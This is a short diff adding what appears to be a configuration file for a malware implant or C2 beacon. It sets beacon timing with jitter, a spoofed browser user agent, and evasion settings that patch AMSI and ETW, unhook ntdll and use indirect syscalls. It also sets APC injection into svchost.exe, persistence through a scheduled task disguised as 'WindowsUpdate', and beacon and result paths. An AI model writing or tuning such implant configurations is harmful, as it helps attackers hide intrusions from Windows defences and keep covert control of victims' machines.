@@ -1,0 +1,23 @@
+[implant]
+sleep_ms = 60000
+jitter_pct = 40
+protocol = "https"
+user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+[evasion]
+unhook_ntdll = true
+patch_amsi = true
+patch_etw = true
+syscall_mode = "indirect"
+
+[inject]
+method = "apc_queue"
+target = "svchost.exe"
+
+[persist]
+method = "scheduled_task"
+name = "WindowsUpdate"
+
+[comms]
+beacon_path = "/beacon"
+result_path = "/result"
